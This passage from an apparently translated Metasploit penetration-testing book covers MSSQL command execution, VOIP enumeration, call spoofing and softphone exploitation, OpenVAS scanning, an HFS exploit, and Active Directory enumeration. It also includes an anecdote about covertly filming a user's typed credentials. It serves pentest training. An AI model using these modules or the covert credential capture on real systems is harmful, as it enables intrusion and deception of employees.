![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cbe68e99-fd1f-4522-a65d-9fe847434074.png)

运行`mssql_enum`模块后，我们将能够收集关于数据库服务器的大量信息。让我们看看它提供了什么样的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/95fe963a-6f16-46e9-a2a4-b77e0da837cf.png)

正如我们所看到的，该模块向我们呈现了关于数据库服务器的几乎所有信息，如存储过程、名称、当前存在的数据库数量、禁用的账户等。

我们还将在接下来的*重新加载 xp_cmdshell 功能*部分中看到，我们可以绕过一些禁用的存储过程。而且，像`xp_cmdshell`这样的存储过程可能导致整个服务器被 compromise。我们可以在之前的截图中看到`xp_cmdshell`在服务器上是启用的。让我们看看`mssql_enum`模块还为我们提供了什么其他信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/376c5726-3867-4631-bc1e-ee1be64414a6.png)

运行该模块，我们得到了一系列存储过程、空密码的账户、数据库的窗口登录和管理员登录。

# 后期利用/执行系统命令

在收集了关于目标数据库的足够信息后，让我们进行一些后期利用。为了实现后期利用，我们有两个不同的模块可以非常方便。第一个是`mssql_sql`，它将允许我们在数据库上运行 SQL 查询，第二个是`msssql_exec`，它将使我们能够通过启用`xp_cmdshell`存储过程来运行系统级命令，以防它被禁用。

# 重新加载 xp_cmdshell 功能

`mssql_exec`模块将尝试通过重新加载禁用的`xp_cmdshell`功能来运行系统级命令。此模块将要求我们将`CMD`选项设置为我们要执行的`system`命令。让我们看看它是如何工作的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d6f38bd2-aeff-4de0-b493-910bcaf4ad01.png)

一旦我们完成运行`mssql_exec`模块，结果将如下屏幕截图所示闪现到屏幕上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6d2d0415-d10a-4f66-87d7-607bec59f08e.jpg)

结果窗口显示了针对目标数据库服务器执行`system`命令的成功执行。

# 运行基于 SQL 的查询

我们还可以使用`mssql_sql`模块对目标数据库服务器运行基于 SQL 的查询。将`SQL`选项设置为任何有效的数据库查询将执行它，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6edb5a01-899c-4e20-8c4f-88a551d3385c.png)

我们将`SQL`参数设置为`select @@version`。数据库服务器成功运行了查询，并且我们得到了数据库的版本。

因此，按照上述程序，我们可以使用 Metasploit 测试各种数据库的漏洞。

MySQL 数据库的测试在我的另一本书*Metasploit Bootcamp*中有介绍（[`www.packtpub.com/networking-and-servers/metasploit-bootcamp`](https://www.packtpub.com/networking-and-servers/metasploit-bootcamp)）；试试看。

请参考以下资源以保护 MSSQL 数据库：

[`www.mssqltips.com/sql-server-tip-category/19/security/`](https://www.mssqltips.com/sql-server-tip-category/19/security/)。

对于 MySQL：

[`www.hexatier.com/mysql-database-security-best-practices-2/`](http://www.hexatier.com/mysql-database-security-best-practices-2/)。

# 测试 VOIP 服务

现在，让我们专注于测试 VOIP 服务，并看看我们如何检查可能影响 VOIP 服务的各种缺陷。

# VOIP 基础知识

**互联网语音**（**VOIP**）技术与传统电话服务相比成本要低得多。VOIP 在电信方面比传统电话服务提供了更多的灵活性，并提供了多个功能，如多个分机、来电显示服务、日志记录、每通电话的录音等。多家公司已经在 IP 电话上推出了他们的**专用分支交换**（**PBX**）。

传统和现有的电话系统仍然容易通过物理接触进行拦截，因此，如果攻击者更改电话线的连接并连接他们的发射器，他们将能够在受害者设备上拨打和接听电话，并享受互联网和传真服务。

然而，在 VOIP 服务的情况下，我们可以在不接触电线的情况下破坏安全性。然而，如果您不了解其工作原理，攻击 VOIP 服务将是一项繁琐的任务。本节将介绍如何在网络中破坏 VOIP 而不拦截电线。

# PBX 简介

PBX 是小型和中型公司电话服务的经济解决方案，因为它在公司的机舱和楼层之间提供了更多的灵活性和互联。大公司也可能更喜欢 PBX，因为在大型组织中连接每条电话线到外部线路变得非常繁琐。PBX 包括以下内容：

+   在 PBX 终止的电话干线

+   管理 PBX 内和外的呼叫切换的计算机

+   PBX 内的通信线路网络

+   人工操作员的控制台或交换机

# VOIP 服务的类型

我们可以将 VOIP 技术分为三种不同的类别。让我们看看它们是什么。

# 自托管网络

在这种类型的网络中，PBX 安装在客户端现场，并进一步连接到**互联网服务提供商**（**ISP**）。这些系统通过多个虚拟局域网将 VOIP 流量传输到 PBX 设备，然后将其发送到**公共交换电话网**（**PSTN**）进行电路交换，同时也发送到互联网连接的 ISP。以下图表很好地展示了这种网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ea016a02-b5d4-4688-94df-f3a256e56829.png)

# 托管服务

在托管服务类型的 VOIP 技术中，客户端的场所没有 PBX。然而，客户端场所的所有设备都通过互联网连接到服务提供商的 PBX，即通过使用 IP/VPN 技术的**会话初始协议**（**SIP**）线路。

让我们看看以下图表如何解释这项技术：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ce73a6f0-e29d-42c5-80dc-97fed0a47bdf.png)

# SIP 服务提供商

许多互联网 SIP 服务提供商为软电话提供连接，可以直接使用以享受 VOIP 服务。此外，我们可以使用任何客户端软电话来访问 VOIP 服务，例如 Xlite，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/597f6eba-0c6e-4562-bdb0-2ac62768f561.png)

# 指纹识别 VOIP 服务

我们可以使用 Metasploit 内置的 SIP 扫描器模块对网络中的 VOIP 设备进行指纹识别。一个常见的 SIP 扫描器是**SIP 终端扫描器**。我们可以使用此扫描器通过向网络中的各种 SIP 设备发出选项请求来识别启用 SIP 的设备。

让我们继续使用`/auxiliary/scanner/sip`下的`options`辅助模块扫描 VOIP 并分析结果。这里的目标是运行 Asterisk PBX VOIP 客户端的 Windows XP 系统。我们首先加载用于扫描网络上的 SIP 服务的辅助模块，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/aa2d1967-06be-4a07-87ec-0c2ac70b1658.png)

我们可以看到我们有很多选项可以与`auxiliary/scanner/sip/options`辅助模块一起使用。我们只需要配置`RHOSTS`选项。但是，对于大型网络，我们可以使用**无类域间路由**（**CIDR**）标识符定义 IP 范围。运行后，该模块将开始扫描可能正在使用 SIP 服务的 IP。让我们按照以下方式运行此模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4178a740-3262-4ad6-bab9-f7a852cd86f8.png)

当此模块运行时，它返回了许多与运行 SIP 服务的系统相关的信息。信息包含了称为**agent**的响应，它表示 PBX 的名称和版本，以及定义 PBX 支持的请求类型的动词。因此，我们可以使用此模块收集关于网络上 SIP 服务的大量知识。

# 扫描 VOIP 服务

在找到有关目标支持的各种选项请求的信息后，让我们现在使用另一个 Metasploit 模块`auxiliary/scanner/sip/enumerator`来扫描和枚举 VOIP 服务的用户。此模块将检查目标范围内的 VOIP 服务，并尝试枚举其用户。让我们看看我们如何实现这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4e7b87db-02c1-44cb-a631-f405d8c7151f.png)

我们有前面的选项可用于此模块。我们将设置以下一些选项以成功运行此模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5d01ed57-2395-41fc-a652-2c1cc351cfb6.png)

正如我们所看到的，我们已经设置了`MAXEXT`，`MINEXT`，`PADLEN`和`RHOSTS`选项。

在前面的屏幕截图中使用的 enumerator 模块中，我们将`MINEXT`和`MAXEXT`定义为`3000`和`3005`。`MINEXT`是搜索将从哪个分机号开始的扩展号码，`MAXEXT`是搜索将结束的最后一个分机号码。这些选项可以设置为广泛的范围，例如将`MINEXT`设置为`0`，`MAXEXT`设置为`9999`，以查找在分机号码`0`到`9999`上使用 VOIP 服务的各种用户。

通过将 RHOSTS 变量设置为 CIDR 值，让我们在目标范围上运行此模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/20d3f874-fbdf-4e42-acaf-5d75ed1e91d0.png)

将`RHOSTS`设置为`192.168.65.0/24`将扫描整个子网。现在，让我们运行此模块并查看它呈现了什么输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e10bcd63-6a06-4f2b-ae2c-30cdaf94b9d2.png)

这次搜索返回了许多使用 SIP 服务的用户。此外，`MAXEXT`和`MINEXT`的影响只扫描了从`3000`到`3005`的分机用户。分机可以被认为是特定网络中某个用户的通用地址。

# 欺骗 VOIP 呼叫

在了解了使用 SIP 服务的各种用户的足够知识后，让我们尝试使用 Metasploit 给用户打一个假电话。当用户在 Windows XP 平台上运行 SipXphone 2.0.6.27 时，让我们发送一个虚假的邀请请求给用户，使用`auxiliary/voip/sip_invite_spoof`模块如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5c3ee936-5ebe-430b-8a4f-fb3eaab75839.png)

我们将使用目标的 IP 地址设置`RHOSTS`选项，将`EXTENSION`设置为目标的`4444`。让我们保持`SRCADDR`设置为`192.168.1.1`，这将伪装地址源进行呼叫。

因此，让我们按照以下方式运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/25014672-607d-4e9e-9f74-70e010b014bc.png)

让我们看看受害者这边发生了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cc0f7d19-1e6b-49c2-a4de-552e8c3cde10.png)

我们可以看到软电话正在响铃，显示呼叫者为 192.168.1.1，并显示来自 Metasploit 的预定义消息。

# 利用 VOIP

为了完全访问系统，我们也可以尝试利用软电话软件。从之前的情景中，我们有目标的 IP 地址。让我们使用 Metasploit 扫描和利用它。但是，在 Kali 操作系统中有专门设计用于测试 VOIP 服务的专用 VOIP 扫描工具。以下是我们可以用来利用 VOIP 服务的工具列表：

+   Smap

+   Sipscan

+   Sipsak

+   Voipong

+   Svmap

回到利用部分，我们在 Metasploit 中有一些可以用于软电话的利用程序。让我们看一个例子。

我们要利用的应用程序是 SipXphone 版本 2.0.6.27。该应用程序的界面可能类似于以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/889203a3-4c8d-4ec5-bf6e-2fe1aa1358ed.png)

# 关于漏洞

漏洞在应用程序处理`Cseq`值时存在。发送一个过长的字符串会导致应用程序崩溃，并且在大多数情况下，它将允许攻击者运行恶意代码并访问系统。

# 利用应用程序

现在，让我们利用 Metasploit 来利用 SipXphone 版本 2.0.6.27 应用程序。我们要使用的利用程序是`exploit/windows/sip/sipxphone_cseq`。让我们将此模块加载到 Metasploit 中并设置所需的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f3cb31b2-f346-48aa-8264-1ca111d1ea08.png)

我们需要设置`RHOST`、`LHOST`和`payload`的值。让我们按照以下方式利用目标应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5147c26e-034e-48d7-aa45-cd33c71186fd.png)

哇！我们在极短的时间内就得到了 meterpreter。因此，在使用 Metasploit 时，利用 VOIP 可能很容易。然而，在测试 VOIP 设备和其他与服务相关的缺陷时，我们可以使用第三方工具进行有效的测试。

可以在以下网址找到测试 VOIP 的绝佳资源：[`www.viproy.com/`](http://www.viproy.com/)。

有关保护 VOIP 网络的更多信息，请参考这些优秀的指南：

[`searchsecurity.techtarget.com/feature/Securing-VoIP-Keeping-Your-VoIP-Networks-Safe`](https://searchsecurity.techtarget.com/feature/Securing-VoIP-Keeping-Your-VoIP-Networks-Safe) 和 [`www.sans.org/reading-room/whitepapers/voip/security-issues-countermeasure-voip-1701`](https://www.sans.org/reading-room/whitepapers/voip/security-issues-countermeasure-voip-1701)。

# 总结

在本章中，我们看到了一些使我们能够测试各种服务的利用和渗透测试场景，例如数据库、VOIP 和 SCADA。在本章中，我们了解了 SCADA 及其基本原理。我们看到了如何可以获取有关数据库服务器的各种信息以及如何完全控制它。我们还看到了如何通过扫描网络来测试 VOIP 服务，并进行 VOIP 呼叫欺骗。

在进入下一章之前，您应该进行以下练习：

+   使用 Metasploit 设置和测试 MySQL、Oracle 和 PostgreSQL，并找到并开发缺失模块的模块。

+   尝试在 Metasploit 中自动化 SQL 注入漏洞

+   如果您对 SCADA 和 ICS 感兴趣，请尝试使用 Samurai STFU（[`www.samuraistfu.org/`](http://www.samuraistfu.org/)）

+   利用至少一个演示中未使用的 VOIP 软件

在下一章中，我们将看到如何使用 Metasploit 进行完整的渗透测试，并集成其他流行的渗透测试扫描工具。我们将介绍如何在对特定主题进行渗透测试时进行系统化的操作。我们还将探讨如何创建报告以及报告中应包含或排除哪些内容。


# 第十六章：虚拟测试场地和分期

在过去的几章中，我们已经涵盖了很多内容。现在是时候测试我们在整本书中涵盖的所有方法，以及其他各种著名的测试工具，看看我们如何能够有效地使用行业领先的工具在 Metasploit 中对目标网络、网站或其他服务进行渗透测试和漏洞评估。

在本章中，我们将探讨各种测试方法，并涵盖以下主题：

+   使用 Metasploit 以及行业中的多种其他渗透测试工具。

+   将从各种工具和不同格式生成的报告导入 Metasploit 框架

+   创建渗透测试报告

本章的主要重点是使用 Metasploit 以及其他行业领先的工具进行渗透测试；然而，在进行基于 Web 的测试和其他测试技术时，测试的阶段可能会有所不同，但原则是相同的。

# 使用集成的 Metasploit 服务进行渗透测试

我们可以使用三种不同的方法进行渗透测试。这些方法是白盒、黑盒和灰盒测试技术。**白盒测试**是一种测试程序，测试人员完全了解系统，并且客户愿意提供有关环境的凭据、源代码和其他必要信息。**黑盒测试**是一种测试程序，测试人员对目标几乎一无所知。**灰盒测试**技术是白盒和黑盒技术的结合，测试人员对被测试环境只有少量或部分信息。在本章的后续部分中，我们将进行灰盒测试，因为它结合了两种技术的优点。灰盒测试可能包括或不包括操作系统详细信息、部署的 Web 应用程序、运行的服务器类型和版本以及执行渗透测试所需的其他技术方面。灰盒测试中的部分信息将要求测试人员执行额外的扫描，这将比黑盒测试耗时较少，但比白盒测试耗时更长。

考虑这样一个情景，我们知道目标服务器正在运行 Windows 操作系统；然而，我们不知道正在运行哪个版本的 Windows。在这种情况下，我们将消除对 Linux 和 UNIX 系统的指纹技术，并主要关注 Windows 操作系统，从而通过考虑单一操作系统的版本而节省时间，而不是扫描每种操作系统。

使用灰盒测试技术进行渗透测试时，我们需要涵盖以下阶段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/473b0618-348d-446a-9109-081c2458a664.png)

上图说明了在进行灰盒分析的渗透测试时需要涵盖的各个阶段。如图所示，虚线标记的阶段定义了可能需要或不需要的阶段。双线标记的阶段指定了关键阶段，而最后一个（单一连续线）描述了在进行测试时应遵循的标准阶段。现在让我们开始渗透测试，并分析灰盒测试的各个方面。

# 与员工和最终用户的互动

与员工和最终用户的沟通是到达客户现场后要进行的第一个阶段。这个阶段包括**非技术性黑客**，也可以描述为**社会工程学**。其目的是从最终用户的角度获取有关目标系统的知识。这个阶段还回答了一个组织是否受到了通过最终用户泄露信息的保护。以下示例应该使事情更加透明。

去年，我们的团队正在进行白盒测试，并且我们访问了客户现场进行现场内部测试。我们一到达，就开始与最终用户交谈，询问他们在使用新安装的系统时是否遇到任何问题。出乎意料的是，公司里没有一个客户允许我们触碰他们的系统，但他们很快解释说他们在登录时遇到了问题，因为每个会话不能接受超过 10 个连接。

我们对公司的安全政策感到惊讶，该政策不允许我们访问他们的任何客户系统；但后来，我的一个队友看到一位大约 55-60 岁的老人在账户部门挣扎着使用互联网。我们问他是否需要帮助，他很快同意了。我们告诉他，他可以通过连接 LAN 电缆到我们的笔记本电脑来完成未完成的交易。他把 LAN 电缆插入我们的电脑，开始工作。站在他身后的我的同事打开了他的笔形摄像头，迅速记录了他的所有打字活动，比如他用来登录内部网络的凭据。

我们发现另一名女性正在与她的系统苦苦挣扎，并告诉我们她在登录时遇到了问题。我们向这位女士保证我们会解决这个问题，因为她的账户需要从后端解锁。我们要求她的用户名、密码以及登录机制的 IP 地址。她同意并把凭据传给了我们，这就结束了我们的例子：这样的员工如果遇到问题，无论这些环境有多安全，都可能意外泄露他们的凭据。我们后来将这个问题作为报告的一部分报告给了公司。

对最终用户有意义的其他类型信息包括以下内容：

+   他们正在使用的技术

+   服务器的平台和操作系统详细信息

+   隐藏的登录 IP 地址或管理区域地址

+   系统配置和操作系统详细信息

+   Web 服务器背后的技术

这些信息是必需的，并将有助于在了解可测试系统中使用的技术的基础上，确定测试的关键领域。

然而，在执行灰盒渗透测试时，这个阶段可能包括也可能不包括。这类似于公司要求您在公司所在地完成测试，如果公司很远，甚至可能在另一个国家。在这些情况下，我们将排除这个阶段，并询问公司的管理员或其他官员有关他们正在使用的各种技术以及其他相关信息。

# 情报收集

与最终用户交谈后，我们需要深入了解网络配置并了解目标网络；然而，从最终用户那里收集到的信息可能不完整，更有可能是错误的。渗透测试人员必须确认每个细节两次，因为误报和虚假信息可能会在渗透测试过程中造成问题。

情报收集涉及捕获有关目标网络、使用的技术以及正在运行的服务版本等深入细节。

情报收集可以通过从最终用户、管理员和网络工程师收集的信息来执行。在远程测试的情况下，或者如果获得的信息部分不完整，我们可以使用各种漏洞扫描器，如 Nessus、GFI Lan Guard、OpenVAS 等，来找出任何缺失的信息，如操作系统、服务以及 TCP 和 UDP 端口。

在接下来的部分，我们将制定我们收集情报的需求，使用 OpenVAS、Mimikatz 等行业领先的工具；但在继续之前，让我们考虑一下使用从客户现场访问、预交互和问卷调查收集到的部分信息进行测试的环境设置。

# 正在测试的示例环境

根据我们使用问卷调查、互动和客户现场访问收集的信息，我们得出以下示例环境，将对其进行测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3f1b425f-517a-4a10-90e7-d30bf432dcc3.png)

我们获得了 VPN 访问权限，并被要求对网络进行渗透测试。我们还了解到公司网络上运行的操作系统是基于 Windows 的操作系统。我们假设我们已经完成了 NMAP 扫描，并发现了运行在`192.168.0.196`上的用户系统。现在我们准备使用 Metasploit 和其他行业领先的工具进行全面的渗透测试。我们将使用的主要工具是**OpenVAS**。OpenVAS 是一个漏洞扫描器，是最先进的漏洞管理工具之一。OpenVAS 最好的地方在于它完全免费，这使得它成为小规模公司和个人的首选；然而，OpenVAS 有时可能会有 bug，您可能需要一些努力来手动修复 bug，但由于它是社区中的一颗明珠，OpenVAS 将始终是我最喜欢的漏洞扫描器。

要在 Kali Linux 上安装 OpenVAS，请参考[`www.kali.org/penetration-testing/openvas-vulnerability-scanning/`](https://www.kali.org/penetration-testing/openvas-vulnerability-scanning/)。

# 使用 Metasploit 进行 OpenVAS 的漏洞扫描

要在 Metasploit 中集成 OpenVAS 的使用，我们需要加载 OpenVAS 插件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/918080a6-cb91-403d-a87b-dc933399c905.png)

我们还可以看到有许多其他流行工具的模块，如 SQLMAP、Nexpose 和 Nessus。

要加载 OpenVAS 扩展到 Metasploit 中，我们需要从 Metasploit 控制台发出`load openvas`命令。

我们可以在上一个屏幕截图中看到，OpenVAS 插件已成功加载到 Metasploit 框架中。

要在 Metasploit 中使用 OpenVAS 的功能，我们需要将 OpenVAS Metasploit 插件与 OpenVAS 本身连接起来。我们可以通过使用`openvas_connect`命令，然后是用户凭据、服务器地址、端口号和 SSL 状态来实现这一点，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b39fb6ba-8cb5-4a2d-865b-9aaeb45d966a.png)

在开始之前，让我们讨论工作空间，这是管理渗透测试的一个很好的方式，特别是当你在一家专门从事渗透测试和漏洞评估的公司工作时。通过切换和创建不同的工作空间来有效地处理不同的项目。使用工作空间还可以确保测试结果不会与其他项目混在一起。因此，在进行渗透测试时强烈建议使用工作空间。

创建并切换到新的工作空间非常容易，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/31e642a3-595b-4074-96b4-7f176584b99f.png)

在上一个屏幕截图中，我们添加了一个名为`AD_Test`的新工作空间，并通过简单地输入`workspace`，然后输入`AD_Test`（工作空间的名称）来切换到它。

要开始漏洞扫描，我们需要创建的第一件事是一个目标。我们可以使用`openvas_target_create`命令创建尽可能多的目标，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6e80ee61-5a85-4b77-ba27-605b6ec9d40f.png)

我们可以看到，我们为`192.168.0.196` IP 地址创建了一个名为`196_System`的目标，并将其注释为`196_System_in_AD`，只是为了更容易记住。此外，记住目标的 ID 也是很好的。

继续前进，我们需要为正在测试的目标定义一个策略。我们可以通过发出`openvas_config_list`命令来列出示例策略，如下所示：

```
msf > openvas_config_list 
[+] OpenVAS list of configs

ID                                    Name
--                                    ----
085569ce-73ed-11df-83c3-002264764cea  empty
2d3f051c-55ba-11e3-bf43-406186ea4fc5  Host Discovery
698f691e-7489-11df-9d8c-002264764cea  Full and fast ultimate
708f25c4-7489-11df-8094-002264764cea  Full and very deep
74db13d6-7489-11df-91b9-002264764cea  Full and very deep ultimate
8715c877-47a0-438d-98a3-27c7a6ab2196  Discovery
bbca7412-a950-11e3-9109-406186ea4fc5  System Discovery
daba56c8-73ec-11df-a475-002264764cea  Full and fast
```

为了学习的目的，我们将只使用`Full and fast ultimate`策略。请注意策略 ID，在本例中为`698f691e-7489-11df-9d8c-002264764cea`。

现在我们有了目标 ID 和策略 ID，我们可以继续使用`openvas_task_create`命令创建一个漏洞扫描任务，如下所示：

```
msf > openvas_task_create 
[*] Usage: openvas_task_create <name> <comment> <config_id> <target_id>

msf > openvas_task_create 196_Scan NA **698f691e-7489-11df-9d8c-002264764cea 5e34d267-af41-4fe2-b729-2890ebf9ce97**
[*] 694e5760-bec4-4f80-984f-7c50105a1e00
[+] OpenVAS list of tasks
ID                                   Name      Comment  Status Progress
--                                  ----      -------  ------  --------
694e5760-bec4-4f80-984f-7c50105a1e00 196_Scan  NA       New     -1
```

我们可以看到我们使用`openvas_task_create`命令创建了一个新任务，然后分别是任务名称、注释、配置 ID 和目标 ID。有了创建的任务，我们现在准备启动扫描，如下面的输出所示：

```
msf > openvas_task_start 694e5760-bec4-4f80-984f-7c50105a1e00
[*] <X><authenticate_response status='200' status_text='OK'><role>Admin</role><timezone>UTC</timezone><severity>nist</severity></authenticate_response><start_task_response status='202' status_text='OK, request submitted'><report_id>c7886b9c-8958-4168-9781-cea09699bae6</report_id></start_task_response></X>  
```

在之前的结果中，我们可以看到我们使用`openvas_task_start`命令初始化了扫描，然后是任务 ID。我们可以随时使用`openvas_task_list`命令检查任务的进展，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ac3f1b6a-8eef-40b2-8fcd-a6e7664af14c.png)

保持关注进展，一旦任务完成，我们可以使用`openvas_report_list`命令列出扫描报告，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/accb2927-3f7f-45da-b2e9-d07dae59aa44.png)

我们可以使用`openvas_report_download`命令下载这个报告，并直接将其导入到数据库中，然后是报告 ID、格式 ID、路径和名称，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8772a9ab-21f6-4fbd-acf9-de8f2e0f687b.png)

我们现在可以使用`db_import`命令在 Metasploit 中导入报告，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/259e4ab2-2b1d-49db-a73d-b4fcdd987b01.png)

格式 ID 可以使用`openvas_format_list`命令找到，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/de7f0015-88e5-4135-9d48-9eb10923d5fb.png)

成功导入后，我们可以使用`vulns`命令检查 MSF 数据库中的漏洞，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8b5f1a9d-cf53-4f64-a9c8-95d593f34bbb.png)

我们可以看到我们在数据库中有所有的漏洞。我们可以通过登录到端口`9392`上的浏览器中的 Greenbone Assistant 来交叉验证漏洞数量并深入了解详细信息，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a35ff600-22a4-4b6b-ae5c-854b95cbd3ae.png)

我们可以看到我们有多个高影响的漏洞。现在是一个很好的时机来进行威胁建模，并只针对特定的弱点进行目标定位。

# 威胁区域建模

在进行渗透测试时，威胁区域建模是一个重要的关注点。这个阶段侧重于网络中需要关注和保护的特定区域。网络或系统中漏洞的影响取决于威胁区域。我们可能会在系统或网络中发现一些漏洞。然而，那些可能对关键区域产生影响的漏洞是首要关注的。这个阶段侧重于筛选那些可能对资产产生最大影响的漏洞。威胁区域建模将帮助我们针对正确的一组漏洞。然而，如果客户要求，这个阶段可以被跳过。

影响分析并标记对目标影响最大的漏洞也是必要的。此外，当受检网络范围广泛且只有关键区域需要测试时，这个阶段也是至关重要的。

从 OpenVAS 的结果中，我们可以看到 DCE/RPC 和 MSRPC 服务枚举报告漏洞，但由于网络是内部的，可能不会对基础设施造成任何伤害。因此，它被排除在利用的角度之外。此外，利用 DOS 等漏洞可能会导致**蓝屏**（**BSOD**）。在大多数基于生产的渗透测试中应避免 DOS 测试，并且只应在事先获得客户许可的测试环境中考虑。因此，我们跳过它，转而寻找可靠的漏洞，即 HTTP 文件服务器远程命令执行漏洞。浏览 OpenVAS Web 界面中漏洞的详细信息，我们可以发现该漏洞对应于 CVE `2014-6287`，在 Metasploit 中对应于`exploit/windows/http/rejetto_hfs_exec`模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2d74708a-dadf-4711-82a9-af0b8ab5f01b.png)

# 获取目标访问权限

让我们通过加载模块并设置所需的选项来利用漏洞，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a48fc3bc-110c-4257-8300-1e3c9c2d1b8e.png)

我们可以看到我们已经放置了所有必要的选项，所以让我们使用`exploit`命令来利用系统，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/21f78500-b808-4216-92d5-2ac17888e4b9.png)

砰！我们成功进入了系统。让我们进行一些后渗透，看看我们利用了什么样的系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a4fff92-ed56-4a99-9d9d-e96bf366b3af.png)

运行`sysinfo`命令告诉我们系统是一个 Windows 10 x64 系统，目前属于一个名为 PYSSG 的域，有七个已登录用户，这很有趣。让我们运行`arp`命令看看我们是否能识别网络上的一些系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f8bf49c4-bca5-4b8d-8d6e-2652a3e75f37.png)

我们可以看到网络上有很多其他系统在运行，但我们知道网络是在活动目录下配置的。此时，我们可能考虑对活动目录架构本身进行渗透测试，并收集关于网络其他部分的信息，可能还能够获得对域控制器本身的访问权限。

# 使用 Metasploit 攻击 Active Directory（AD）

由于我们已经在活动目录网络中的一台机器上获得了访问权限，我们必须找到并记录域控制器，然后利用这些详细信息来破解域控制器本身。

# 查找域控制器

让我们使用`enum_domain`模块来查找域控制器，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2fae25bb-ed0f-4a1f-b2af-877a92510412.png)

我们可以看到我们有域、域控制器和其 IP 地址等详细信息。模块所需的唯一选项是从受损机器获得的 Meterpreter 的会话标识符。

# 枚举在 Active Directory 网络中的共享

要在网络中查找共享，我们可以简单地使用`enum_shares`模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c17e6c1b-ecae-44c7-b2ff-b44542af54a3.png)

我们可以看到网络中有一个打印共享；然而，这看起来并不乐观。让我们尝试一些其他模块。

# 枚举 AD 计算机

我们还可以尝试使用`enum_domain_computers`后模块查找 AD 中系统的详细信息，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3f791cfe-caaa-4686-af77-5aa68502e586.png)

我们可以看到我们已经为模块设置了会话标识符。让我们运行模块并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ec505c8f-7637-4262-8d4c-c808ddc88281.png)

我们可以看到我们已经获得了域详细信息、计算机名称、OU，甚至操作系统版本，即 Windows Server 2016 标准版。嗯，Windows Server 2016 是一个太现代的系统，要在其中找到并利用漏洞将是一项艰巨的任务。尽管如此，让我们继续寻找一些令人兴奋的信息。

# 枚举在 Active Directory 中登录的用户

有时，我们可能能够窃取管理员的令牌并使用它来执行各种任务。让我们看看目前有哪些用户登录到网络中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fd8e26fe-9299-4bff-afe5-964b8a516c73.png)

